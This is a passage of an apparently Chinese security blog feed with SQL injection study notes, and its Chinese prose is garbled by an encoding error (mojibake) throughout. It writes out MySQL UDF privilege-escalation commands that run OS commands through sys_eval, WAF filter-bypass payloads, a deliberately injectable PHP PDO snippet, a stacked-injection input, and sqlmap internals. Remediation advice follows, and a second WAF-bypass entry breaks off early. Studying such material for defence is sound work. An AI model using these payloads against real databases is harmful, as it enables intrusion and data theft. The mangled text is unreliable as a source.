href="https://www.t00ls.com/thread-46107-1-1.html">Mysql_UDF_BackDoorå¼€å‘å®è·µ - ç¨‹åºä»£ç å­¦ä¹ (Learning Program) - T00ls | ä½è°ƒæ±‚å‘å±• - æ½œå¿ƒä¹ å®‰å…¨</a></p><p>UDFææƒæµç¨‹</p><p>å·¥å…·ï¼š<a href="https://github.com/echohun/tools/blob/master/%E5%A4%A7%E9%A9%AC/udf.php">tools&#x2F;å¤§é©¬&#x2F;udf.php at master Â· echohun&#x2F;tools (github.com)</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æ‰¾åˆ°mysqlçš„æ’ä»¶ç›®å½•(å®‰è£…ç›®å½•ä¸‹çš„lib/plugin/)</span></span><br><span class="line">show variables like <span class="string">&#x27;%plugin%&#x27;</span>; <span class="comment"># è¿”å›æ’ä»¶ç›®å½•</span></span><br><span class="line">select @@basedir; <span class="comment"># è¿”å›å®‰è£…ç›®å½•</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å†™å…¥åŠ¨æ€é“¾æ¥åº“</span></span><br><span class="line">sqlmapå†™å…¥</span><br><span class="line">æ‰‹åŠ¨åå…­è¿›åˆ¶å†™å…¥</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºè‡ªå®šä¹‰å‡½æ•°å¹¶è°ƒç”¨å‘½ä»¤</span></span><br><span class="line">CREATE FUNCTION sys_eval RETURNS STRING SONAME <span class="string">&#x27;udf.dll&#x27;</span>; <span class="comment"># åˆ›å»ºsys_evalå‡½æ•°</span></span><br><span class="line">select sys_eval(<span class="string">&#x27;whoami&#x27;</span>); <span class="comment"># æ‰§è¡Œwhoamiå‘½ä»¤</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ é™¤è‡ªå®šä¹‰å‡½æ•°</span></span><br><span class="line">drop <span class="keyword">function</span> sys_eval;</span><br></pre></td></tr></table></figure><p><strong>MOFææƒ</strong></p><ul><li>Windows Server 2003 </li><li>C:&#x2F;Windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F; ç›®å½•ä¸‹çš„ mof æ–‡ä»¶æ¯ éš”ä¸€æ®µæ—¶é—´ï¼ˆå‡ ç§’é’Ÿå·¦å³ï¼‰éƒ½ä¼šè¢«ç³»ç»Ÿæ‰§è¡Œ</li></ul><h1 id="Mysqlç»•è¿‡è¡¥å……"><a href="#Mysqlç»•è¿‡è¡¥å……" class="headerlink" title="Mysqlç»•è¿‡è¡¥å……"></a>Mysqlç»•è¿‡è¡¥å……</h1><h3 id="é€šç”¨ç»•è¿‡"><a href="#é€šç”¨ç»•è¿‡" class="headerlink" title="é€šç”¨ç»•è¿‡"></a>é€šç”¨ç»•è¿‡</h3><ul><li><p>å¤§å°å†™ç»•è¿‡</p><p>ä¿®å¤ï¼šæ­£åˆ™<code>/i</code></p></li><li><p>åŒå†™ç»•è¿‡ï¼ˆwafå°†å…³é”®å­—æ›¿æ¢ä¸ºç©ºï¼Œä¸”æ¬¡æ•°ä¸º1ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uniunionon</span><br></pre></td></tr></table></figure><p>ä¿®å¤ï¼šæ­£åˆ™<code>/m</code></p></li></ul><h3 id="æ³¨é‡Šç¬¦ç»•è¿‡"><a href="#æ³¨é‡Šç¬¦ç»•è¿‡" class="headerlink" title="æ³¨é‡Šç¬¦ç»•è¿‡"></a>æ³¨é‡Šç¬¦ç»•è¿‡</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># æ‰‹åŠ¨é—­åˆ</span><br><span class="line">$sql=&quot;select * from users where id=&#x27;$id&#x27;;&quot;</span><br><span class="line"></span><br><span class="line">$id=1&#x27; and &#x27;1&#x27;=&#x27;2</span><br><span class="line"></span><br><span class="line">select * from users where id=&#x27;1&#x27; and &#x27;1&#x27;=&#x27;2&#x27;;</span><br></pre></td></tr></table></figure><h3 id="ç©ºæ ¼ç»•è¿‡"><a href="#ç©ºæ ¼ç»•è¿‡" class="headerlink" title="ç©ºæ ¼ç»•è¿‡"></a>ç©ºæ ¼ç»•è¿‡</h3><ul><li><p><code>%0a</code></p></li><li><p><code>%0d%0a</code></p></li><li><p><code>/**/</code></p></li><li><p>æ‹¬å·ç»•è¿‡</p><blockquote><p>åœ¨MySQLä¸­ï¼Œæ‹¬å·æ˜¯ç”¨æ¥åŒ…å›´å­æŸ¥è¯¢çš„ã€‚å› æ­¤ï¼Œä»»ä½•å¯ä»¥è®¡ç®—å‡ºç»“æœçš„è¯­å¥ï¼Œéƒ½å¯ä»¥ç”¨æ‹¬å·åŒ…å›´èµ·æ¥ã€‚è€Œæ‹¬å·çš„ä¸¤ç«¯ï¼Œå¯ä»¥æ²¡æœ‰å¤šä½™çš„ç©ºæ ¼ã€‚</p></blockquote><p><img src="/../images/image-20230522161003063.png" alt="image-20230522161003063"></p></li></ul><h3 id="å¼•å·ç»•è¿‡"><a href="#å¼•å·ç»•è¿‡" class="headerlink" title="å¼•å·ç»•è¿‡"></a>å¼•å·ç»•è¿‡</h3><h4 id="ä¸è®©ç”¨å•å¼•å·"><a href="#ä¸è®©ç”¨å•å¼•å·" class="headerlink" title="ä¸è®©ç”¨å•å¼•å·"></a>ä¸è®©ç”¨å•å¼•å·</h4><p>å¯ä»¥ç”¨åå…­è¿›åˆ¶ä»£æ›¿</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">where(table_name=&#x27;users&#x27;) â†’ where(table_name=0x7573657273)</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230522163358530.png" alt="image-20230522163358530"></p><h4 id="è½¬ä¹‰äº†å•å¼•å·"><a href="#è½¬ä¹‰äº†å•å¼•å·" class="headerlink" title="è½¬ä¹‰äº†å•å¼•å·"></a>è½¬ä¹‰äº†å•å¼•å·</h4><p>å®½å­—èŠ‚æ³¨å…¥ï¼ŒäºŒæ¬¡æ³¨å…¥</p><h3 id="å­—ç¬¦ä¸²è¿æ¥å‡½æ•°"><a href="#å­—ç¬¦ä¸²è¿æ¥å‡½æ•°" class="headerlink" title="å­—ç¬¦ä¸²è¿æ¥å‡½æ•°"></a>å­—ç¬¦ä¸²è¿æ¥å‡½æ•°</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">concat(&quot;str1&quot;, &quot;,&quot; ,&quot;str2&quot;)</span><br><span class="line"></span><br><span class="line">concat_ws(&quot;,&quot; , &quot;str1&quot; , &quot;str2&quot;)</span><br><span class="line"></span><br><span class="line">group_concat(&quot;str1&quot;, &quot;,&quot; ,&quot;str2&quot;)</span><br></pre></td></tr></table></figure><h3 id="selectç»•è¿‡"><a href="#selectç»•è¿‡" class="headerlink" title="selectç»•è¿‡"></a>selectç»•è¿‡</h3><ul><li><p>å·²çŸ¥è¡¨åå¯ä»¥ç”¨<code>handle</code></p></li><li><p>ç‰ˆæœ¬&gt;&#x3D;8.0</p><p><a href="https://blog.csdn.net/rfrder/article/details/118726022">mysql 8.0.21ä»¥ä¸Šç‰ˆæœ¬çš„æ–°ç‰¹æ€§</a></p></li><li><p>åœ¨å¯¹å½“å‰è¡¨çš„åˆ—åæ³¨å…¥æ—¶ï¼Œå¯ä»¥ç›´æ¥å†™å­—æ®µåï¼Œè€Œæ— éœ€<code>select è¯¥å­—æ®µ from è¯¥è¡¨</code></p><p><img src="/../images/image-20230522161753632.png" alt="image-20230522161753632"></p></li></ul><h3 id="é€—å·ç»•è¿‡"><a href="#é€—å·ç»•è¿‡" class="headerlink" title="é€—å·ç»•è¿‡"></a>é€—å·ç»•è¿‡</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">substr(databse(),1,1) ç­‰ä»·äº substr(databse() from 1 for 1)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 1,2,3; ç­‰ä»·äº select * from (select 1)a join (select 2)b join (select 3)c;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220718092241142.png" alt="image-20220718092241142"></p><h3 id="å†…è”æ³¨é‡Š"><a href="#å†…è”æ³¨é‡Š" class="headerlink" title="å†…è”æ³¨é‡Š"></a>å†…è”æ³¨é‡Š</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># å¦‚æœåŠ äº†!å°±ä¼šæ‰§è¡Œåœ¨/* */å†…çš„è¯­å¥</span><br><span class="line">/*!union select 1,2*/</span><br><span class="line"></span><br><span class="line"># è¦å°†æ•´ä¸ªè¯­å¥å†™å…¥/* */å†…</span><br><span class="line">/*!union select */1,2 è¿™æ˜¯é”™è¯¯çš„</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#  version 5.7.26</span><br><span class="line">/*!00000 select 1,2*/; å¯ä»¥</span><br><span class="line">/*!50726 select 1,2*/;  å¯ä»¥</span><br><span class="line">/*!50727 select 1,2*/;  ä¸å¯ä»¥</span><br><span class="line"></span><br><span class="line">00000 åˆ° 50726ä¹‹é—´æ˜¯å¯ä»¥çš„</span><br></pre></td></tr></table></figure><h3 id="æ— åˆ—åæ³¨å…¥"><a href="#æ— åˆ—åæ³¨å…¥" class="headerlink" title="æ— åˆ—åæ³¨å…¥"></a>æ— åˆ—åæ³¨å…¥</h3><h4 id="åœºæ™¯"><a href="#åœºæ™¯" class="headerlink" title="åœºæ™¯"></a>åœºæ™¯</h4><p><code>information_schem</code>è¢«è¿‡æ»¤ï¼Œä¸çŸ¥é“è¡¨çš„å­—æ®µå</p><h4 id="è§£å†³æ–¹æ³•"><a href="#è§£å†³æ–¹æ³•" class="headerlink" title="è§£å†³æ–¹æ³•"></a>è§£å†³æ–¹æ³•</h4><p>é€šè¿‡<code>select æ•°å­—</code>å°†å­—æ®µåè®¾ç½®ä¸ºæ•°å­—</p><p><img src="/../images/image-20230523141619236.png" alt="image-20230523141619236"></p><p>å†ç”¨è”åˆæŸ¥è¯¢å°†éœ€è¦çš„æ•°æ®å­˜åˆ°ä¸Šå›¾çš„è¡¨ä¸­</p><p><img src="/../images/image-20230523141701416.png" alt="image-20230523141701416"></p><p>é‚£ä¹ˆæƒ³è¦æŸ¥è¯¢<code>users</code>è¡¨ä¸­çš„<code>username</code>å­—æ®µçš„å€¼</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select `2` from (select 1,2,3 union select * from user)åˆ«å;</span><br><span class="line"></span><br><span class="line"># åˆ«åæ˜¯(select 1,2 union select * from user)è¿”å›çš„è¡¨çš„åˆ«å</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230523141936080.png" alt="image-20230523141936080"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># å¦‚æœåå¼•å·è¢«è¿‡æ»¤</span><br><span class="line">select group_concat(b) from (select 1,2 as b,3 union select * from users)a;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230523142119240.png" alt="image-20230523142119240"></p><h1 id="é¢„ç¼–è¯‘é—®é¢˜"><a href="#é¢„ç¼–è¯‘é—®é¢˜" class="headerlink" title="é¢„ç¼–è¯‘é—®é¢˜"></a>é¢„ç¼–è¯‘é—®é¢˜</h1><h2 id="é¢„ç¼–è¯‘å¤±æ•ˆ"><a href="#é¢„ç¼–è¯‘å¤±æ•ˆ" class="headerlink" title="é¢„ç¼–è¯‘å¤±æ•ˆ"></a>é¢„ç¼–è¯‘å¤±æ•ˆ</h2><p><code>PHP-PDO</code>é‡‡ç”¨æœ¬åœ°é¢„å¤„ç†</p><p><img src="/../images/image-20230330172825283.png" alt="image-20230330172825283"></p><p>ä¼ å…¥<code>?username=&#39;admin&#39;</code>,æŸ¥çœ‹æ—¥å¿—å¦‚ä¸‹</p><blockquote><p>å¼€å¯æ°¸ä¹…æ—¥å¿—,åœ¨é…ç½®æ–‡ä»¶ä¸­åŠ å…¥</p><p>general_log &#x3D; 1<br>general_log_file &#x3D; æ—¥å¿—è·¯å¾„</p></blockquote><p><img src="/../images/image-20230330172741664.png" alt="image-20230330172741664"></p><p>å¯ä»¥çœ‹åˆ°é¢„ç¼–è¯‘ä¸ºå…¶è‡ªåŠ¨æ·»åŠ äº†ä¸€å¯¹å¼•å·ï¼Œå¹¶å°†ç”¨æˆ·è¾“å…¥çš„å¼•å·è¿›è¡Œè½¬ä¹‰ã€‚</p><p>é‚£ä¹ˆå¦‚æœå°†è¡¨åï¼Œ<code>order by xx</code>å¤„è¿›è¡Œé¢„ç¼–è¯‘å°±ä¼šäº§ç”Ÿå¦‚ä¸‹æ•ˆæœ</p><p><img src="/../images/image-20230330001720031.png" alt="image-20230330001720031"></p><p><img src="/../images/image-20230330001733787.png" alt="image-20230330001733787"></p><p>å¯ä»¥çœ‹åˆ°è¿™äº›è¯­å¥â€å¤±æ•ˆäº†â€ï¼ˆæ²¡æœ‰å¾—åˆ°æƒ³è¦çš„ç»“æœï¼‰ï¼Œæ‰€ä»¥åœ¨å®é™…å¼€å‘ä¸­ï¼Œå¯¹äºè¿™äº›è¯­å¥å¤§æ¦‚ç‡å°±æ˜¯è¿›è¡Œä¸€ä¸ªæ‹¼æ¥å¤„ç†ï¼Œå°±å¾ˆå¯èƒ½å­˜åœ¨sqlæ³¨å…¥ã€‚</p><h2 id="é¢„ç¼–è¯‘ä½¿ç”¨é”™è¯¯"><a href="#é¢„ç¼–è¯‘ä½¿ç”¨é”™è¯¯" class="headerlink" title="é¢„ç¼–è¯‘ä½¿ç”¨é”™è¯¯"></a>é¢„ç¼–è¯‘ä½¿ç”¨é”™è¯¯</h2><ul><li><p><a href="https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html">ThinkPHP5 SQLæ³¨å…¥æ¼æ´ &amp;&amp; PDOçœŸ&#x2F;ä¼ªé¢„å¤„ç†åˆ†æ | ç¦»åˆ«æ­Œ</a></p></li><li><p>å †å æ³¨å…¥</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span>= <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="comment"># é¢„å¤„ç†è¯­å¥</span></span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;select * from users where id=<span class="subst">$id</span>&quot;</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"><span class="variable">$fraction</span> = <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$fraction</span>);</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨æ¨¡æ‹Ÿé¢„ç¼–è¯‘ï¼Œå¹¶ä¸”æ²¡æœ‰ç»‘å®šå‚æ•°</p><p>åˆå› ä¸ºPDOé»˜è®¤å¯ä»¥æ”¯æŒå¤šæ¡SQLæ‰§è¡Œï¼Œæ‰€æœ‰é€ æˆäº†å †å æ³¨å…¥ã€‚</p></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1;create database pdo;</span><br></pre></td></tr></table></figure><p>  <img src="/../images/image-20230523131701820.png" alt="image-20230523131701820"></p><h1 id="SqlMapå­¦ä¹ "><a href="#SqlMapå­¦ä¹ " class="headerlink" title="SqlMapå­¦ä¹ "></a>SqlMapå­¦ä¹ </h1><p>sqlmap æºç åˆ†æ</p><p><img src="/../images/routine.png" alt="img"></p><ul><li><p><a href="https://www.anquanke.com/post/id/262848">sqlmap é¡¹ç›®å‰–æ1</a></p></li><li><p><a href="https://www.anquanke.com/post/id/262847">sqlmap é¡¹ç›®å‰–æ2</a></p></li><li><p><a href="https://www.anquanke.com/post/id/262849">sqlmap é¡¹ç›®å‰–æ3</a></p><p>sqlmap ä½¿ç”¨ä¸€ç§æå…¶å·§å¦™çš„æ–¹å¼ç»„åˆç”Ÿæˆä¸€ä¸ªå®Œæ•´çš„ payloadï¼Œä¸€ä¸ªå®Œæ•´çš„ payload ç”±å¦‚ä¸‹å‡ ä¸ªéƒ¨åˆ†ç»„æˆï¼š</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">prefix</span>&gt;</span> <span class="tag">&lt;<span class="name">test</span>&gt;</span> <span class="tag">&lt;<span class="name">comment</span>&gt;</span> <span class="tag">&lt;<span class="name">suffix</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å…¶ä¸­ prefixã€commentã€suffix ä½œä¸º boundaryï¼Œboundary ç”¨äºé—­åˆæ³¨å…¥ç‚¹çš„å‰åéƒ¨åˆ†ï¼›test åˆ™æ˜¯æœ€ç»ˆå¦‚æœé—­åˆæˆåŠŸåå¿…ç„¶æ‰§è¡Œçš„è¯­å¥ã€‚</p><p>å› æ­¤ sqlmap å°† prefix ä¸ suffix å•ç‹¬ä½œä¸º boundaries ä¿å­˜ï¼Œè€Œ test å’Œ comment åˆ™æ ¹æ®æ³¨å…¥æ–¹å¼å’Œæ•°æ®åº“çš„ä¸åŒè¢«åˆ’åˆ†ä¸ºå…­ä¸ªæ–‡ä»¶ï¼ˆè·¯å¾„ï¼š<code>/data/xml/payloads</code>ï¼‰</p><p><img src="/../images/t01d7dbc46705981404.jpg" alt="img"></p></li><li><p><a href="https://www.anquanke.com/post/id/262850">sqlmap é¡¹ç›®å‰–æ4</a></p><p>å¸ƒå°”æ³¨å…¥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å…ˆå‘é€ä¸€ä¸ª false è¯·æ±‚ï¼Œå¦‚æœç»“æœä¸åŸé¡µé¢ç›¸åŒå°±åˆ¤æ–­ä¸å­˜åœ¨å¸ƒå°”æ³¨å…¥</span><br><span class="line">å¦‚æœä¸ç›¸åŒå‘é€ä¸€ä¸ª true è¯·æ±‚,å¦‚æœä¸åŸé¡µé¢ç›¸ä¼¼</span><br><span class="line">åˆ™å†å‘é€ä¸€ä¸ª false è¯·æ±‚ï¼Œç„¶åæŠŠè¿™ä¸¤æ¬¡è¿”å›çš„ç»“æœå–å·®é›†ï¼Œè®¡ç®—å‡ºTrueæ—¶çš„flagæ ‡è¯†ï¼Œä¹Ÿå°±æ˜¯sqlmapçš„-stringå‚æ•°</span><br></pre></td></tr></table></figure><p>æŠ¥é”™æ³¨å…¥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å‘é€æŠ¥é”™payloadï¼Œå¦‚æœèƒ½å¤Ÿæ­£åˆ™åŒ¹é…åˆ°åˆ™è¯´æ˜å­˜åœ¨æŠ¥é”™æ³¨å…¥ã€‚</span><br></pre></td></tr></table></figure><p>å»¶æ—¶æ³¨å…¥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å…ˆå‘é€Nä¸ªæ­£å¸¸è¯·æ±‚ï¼Œç„¶åè®¡ç®—è¿™Nä¸ªè¯·æ±‚å“åº”æ—¶é—´çš„æ ‡å‡†å·®å’Œæ­£å¸¸è¯·æ±‚çš„æœ€é•¿å“åº”æ—¶é—´</span><br><span class="line">ç„¶åå‘é€ä¸€ä¸ªå»¶æ—¶è¯·æ±‚ï¼Œåˆ¤æ–­æ˜¯å¦åœ¨åŒºé—´å†…</span><br></pre></td></tr></table></figure><p>è”åˆæŸ¥è¯¢æ³¨å…¥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ç”¨order byå’ŒäºŒåˆ†æ³•æ¥åˆ¤æ–­åˆ—æ•°</span><br><span class="line">  éå†åˆ—æ•°åˆ¤æ–­å“ªä¸€åˆ—æ˜¯å›æ˜¾ç‚¹</span><br><span class="line">  å‘é€payload</span><br></pre></td></tr></table></figure></li><li><p><a href="https://www.beysec.com/security/sqlmap-source-1.html">sqlmapæºç åˆ†æä¸å­¦ä¹ </a></p></li><li><p><a href="https://www.processon.com/view/5835511ce4b0620292bd7285">sqlmap æµç¨‹è„‘å›¾</a></p></li></ul><p>os-shell åŸç†</p><ul><li><a href="https://xz.aliyun.com/t/7942">sqlmap â€“os-shellåŸç†</a></li><li><a href="https://mp.weixin.qq.com/s?__biz=MzIyMjkzMzY4Ng==&mid=2247485339&idx=1&sn=ea76ee0d56b8a95a118a60d111d48160">Sqlmapä¹‹os-shellåŸç†åˆ†æ</a></li></ul><p>æ”»é˜²</p><ul><li><a href="https://xz.aliyun.com/t/10385">å®æˆ˜sqlmapç»•è¿‡WAF</a></li><li><a href="https://www.anquanke.com/post/id/261915">sqlmap â€“os-shellååˆ¶å°æ€è·¯</a></li><li><a href="https://mp.weixin.qq.com/s?__biz=Mzg4MzA4Nzg4Ng==&mid=2247494179&idx=1&sn=e6c94b87981fda009e7be50c9eb73bf6">å…¥ä¾µæ£€æµ‹ä¹‹sqlmapæ¶æ„æµé‡åˆ†æ</a></li></ul><h1 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h1><ul><li><p>æ­£ç¡®ä½¿ç”¨é¢„ç¼–è¯‘+é»‘åå•</p></li><li><p>é…ç½®é—®é¢˜</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  ç«™åº“åˆ†ç¦»</span><br><span class="line">  ä¸å…è®¸å¤–è¿</span><br><span class="line">  æ•°æ®åº“ä»¥ä½æƒé™è¿è¡Œ</span><br><span class="line">  ä¸æ˜¾ç¤ºæŠ¥é”™</span><br><span class="line">  ä¸ä½¿ç”¨å¤šè¯­å¥æŸ¥è¯¢</span><br><span class="line">  secure_file_priv=NULL</span><br><span class="line">å­—ç¬¦é›†ä¿æŒä¸€è‡´</span><br></pre></td></tr></table></figure></li></ul><h1 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h1><p><a href="https://www.anquanke.com/post/id/98096">Dnslogåœ¨SQLæ³¨å…¥ä¸­çš„å®æˆ˜-å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å°</a></p><p><a href="https://cloud.tencent.com/developer/article/1938545">https://cloud.tencent.com/developer/article/1938545</a></p><p><a href="https://forum.butian.net/share/1559">å¥‡å®‰ä¿¡æ”»é˜²ç¤¾åŒº-SQLæ³¨å…¥&amp;é¢„ç¼–è¯‘</a></p><p><a href="https://xz.aliyun.com/t/3950">PDOåœºæ™¯ä¸‹çš„SQLæ³¨å…¥æ¢ç©¶ - å…ˆçŸ¥ç¤¾åŒº</a></p>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>WAFç»•è¿‡å­¦ä¹ </title>
      <link href="/2023/06/26/Waf%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/"/>
      <url>/2023/06/26/Waf%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="çŸ¥å·±çŸ¥å½¼"><a href="#çŸ¥å·±çŸ¥å½¼" class="headerlink" title="çŸ¥å·±çŸ¥å½¼"></a>çŸ¥å·±çŸ¥å½¼</h1><p><a href="https://www.cnblogs.com/realjimmy/p/12937247.html">WAFåŠŸèƒ½ä»‹ç»ï¼ˆå…¥é—¨æ‰«ç›²ç¯‡ï¼‰ - ä¸€è§‰é†’æ¥å†™ç¨‹åº - åšå®¢å›­</a></p><h2 id="WAFçš„å·¥ä½œæµç¨‹"><a href="#WAFçš„å·¥ä½œæµç¨‹" class="headerlink" title="WAFçš„å·¥ä½œæµç¨‹"></a>WAFçš„å·¥ä½œæµç¨‹</h2><ul><li><p><strong>é¢„å¤„ç†</strong></p><ul><li><p>ç½‘ç»œå±‚è¿‡æ»¤ï¼šIPé»‘ç™½åå•</p><blockquote><p>ç”±äºHTTPæ˜¯åº”ç”¨å±‚çš„åè®®ï¼Œæ¯æ¬¡WAFéƒ½è¦è§£æå®ƒï¼Œä¼šé€ æˆå¾ˆå¤§æ€§èƒ½æŸè€—ã€‚è€Œå¯¹äºæŸäº›ç»å¸¸å‘æ¶æ„è¯·æ±‚çš„IPæˆ–è¿›è¡ŒCCæ”»å‡»çš„IPï¼Œå¦‚æœèƒ½å¤Ÿåœ¨ç½‘ç»œå±‚å°±æŠŠå®ƒä»¬æ‹¦æˆªäº†ï¼Œå¯¹WAFæ€§èƒ½æ˜¯æœ‰å¾ˆå¤§çš„æå‡ã€‚</p></blockquote></li><li><p>åº”ç”¨å±‚è¿‡æ»¤ï¼šåœ¨æ¥æ”¶åˆ°æ•°æ®è¯·æ±‚æµé‡æ—¶ä¼šå…ˆåˆ¤æ–­æ˜¯å¦ä¸ºHTTP&#x2F;HTTPSè¯·æ±‚ï¼Œä¹‹åä¼šæŸ¥çœ‹æ­¤URLè¯·æ±‚æ˜¯å¦åœ¨ç™½åå•ä¹‹å†…ï¼Œå¦‚æœè¯¥URLè¯·æ±‚åœ¨ç™½åå•åˆ—è¡¨é‡Œï¼Œç›´æ¥äº¤ç»™åç«¯WebæœåŠ¡å™¨è¿›è¡Œå“åº”å¤„ç†ï¼Œå¯¹äºä¸åœ¨ç™½åå•ä¹‹å†…çš„å¯¹æ•°æ®åŒ…è§£æåè¿›å…¥åˆ°è§„åˆ™æ£€æµ‹éƒ¨åˆ†ã€‚</p></li></ul></li><li><p><strong>è§„åˆ™æ£€æµ‹</strong></p><p>è§£æåçš„æ•°æ®åŒ…ä¼šè¿›å…¥åˆ°æ£€æµ‹ä½“ç³»ä¸­è¿›è¡Œè§„åˆ™åŒ¹é…ï¼Œæ£€æŸ¥è¯¥æ•°æ®è¯·æ±‚æ˜¯å¦ç¬¦åˆè§„åˆ™ï¼Œè¯†åˆ«å‡ºæ¶æ„æ”»å‡»è¡Œä¸ºã€‚</p></li><li><p><strong>å¤„ç†æ¨¡å—</strong></p><p>é’ˆå¯¹ä¸åŒçš„æ£€æµ‹ç»“æœï¼Œå¤„ç†æ¨¡å—ä¼šåšå‡ºä¸åŒçš„å®‰å…¨é˜²å¾¡åŠ¨ä½œï¼Œå¦‚æœç¬¦åˆè§„åˆ™åˆ™äº¤ç»™åç«¯WebæœåŠ¡å™¨è¿›è¡Œå“åº”å¤„ç†ï¼Œå¯¹äºä¸ç¬¦åˆè§„åˆ™çš„è¯·æ±‚ä¼šæ‰§è¡Œç›¸å…³çš„é˜»æ–­ã€è®°å½•ã€å‘Šè­¦å¤„ç†ã€‚</p></li><li><p><strong>æ—¥å¿—è®°å½•</strong></p><p>WAFåœ¨å¤„ç†çš„è¿‡ç¨‹ä¸­ä¹Ÿä¼šå°†æ‹¦æˆªå¤„ç†çš„æ—¥å¿—è®°å½•ä¸‹æ¥ï¼Œæ–¹ä¾¿ç”¨æˆ·åœ¨åç»­ä¸­å¯ä»¥è¿›è¡Œæ—¥å¿—æŸ¥çœ‹åˆ†æã€‚</p></li></ul><h2 id="WAFåˆ†ç±»"><a href="#WAFåˆ†ç±»" class="headerlink" title="WAFåˆ†ç±»"></a>WAFåˆ†ç±»</h2><p><img src="/../images/image-20230516142728508.png" alt="image-20230516142728508"></p><p>æœ¬æ–‡ä»¥å®‰å…¨ç‹—ä¸ºä¾‹å­è¿›è¡Œç®€å•å­¦ä¹ </p><h2 id="WAFéƒ¨ç½²ä½ç½®"><a href="#WAFéƒ¨ç½²ä½ç½®" class="headerlink" title="WAFéƒ¨ç½²ä½ç½®"></a>WAFéƒ¨ç½²ä½ç½®</h2><p><img src="/../images/2015081104292360563.png" alt="enter image description here"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è¯·æ±‚ â†’ CDN â†’ äº‘waf â†’ ç¡¬waf â†’ WEBæœåŠ¡å™¨ â†’ è½¯waf â†’ WEBåº”ç”¨ç¨‹åºï¼ˆä»£ç wafï¼‰ â†’ (æ•°æ®åº“)</span><br></pre></td></tr></table></figure><h1 id="å‚¨å¤‡çŸ¥è¯†"><a href="#å‚¨å¤‡çŸ¥è¯†" class="headerlink" title="å‚¨å¤‡çŸ¥è¯†"></a>å‚¨å¤‡çŸ¥è¯†</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wafäº†è§£</span><br><span class="line">ç¼–ç å’Œç¼–ç¨‹è¯­è¨€å‡½æ•°</span><br><span class="line">httpåè®®</span><br><span class="line">webæœåŠ¡å™¨ç‰¹æ€§</span><br><span class="line">äº’è”ç½‘æ ‡å‡†æ–‡æ¡£RFC</span><br></pre></td></tr></table></figure><h1 id="å¸¸è§ç»•è¿‡æ‰‹æ³•"><a href="#å¸¸è§ç»•è¿‡æ‰‹æ³•" class="headerlink" title="å¸¸è§ç»•è¿‡æ‰‹æ³•"></a>å¸¸è§ç»•è¿‡æ‰‹æ³•</h1><p><img src="/../images/QQ%E6%88%AA%E5%9B%BE20231017125131.jpg" alt="QQæˆªå›¾20231017125131"></p><h2 id="è¿‚å›ä½œæˆ˜ç±»"><a href="#è¿‚å›ä½œæˆ˜ç±»" class="headerlink" title="è¿‚å›ä½œæˆ˜ç±»"></a>è¿‚å›ä½œæˆ˜ç±»</h2><blockquote><p>ä¸»æ‰“ä¸€ä¸ªä¾§é¢ç»•è¿‡ï¼Œåˆ©ç”¨å„ç§ç¼ºé™·å’Œç‰¹æ€§ä½¿å¾—<strong>wafæ²¡æœ‰è§£æåˆ°payload</strong>ï¼Œè€Œåç«¯å¯ä»¥æ­£å¸¸è§£æï¼Œä¸ä¸wafçš„è§„åˆ™å’Œç­–ç•¥ç¡¬åˆšã€‚</p></blockquote><h3 id="WebæœåŠ¡å™¨ç‰¹æ€§"><a href="#WebæœåŠ¡å™¨ç‰¹æ€§" class="headerlink" 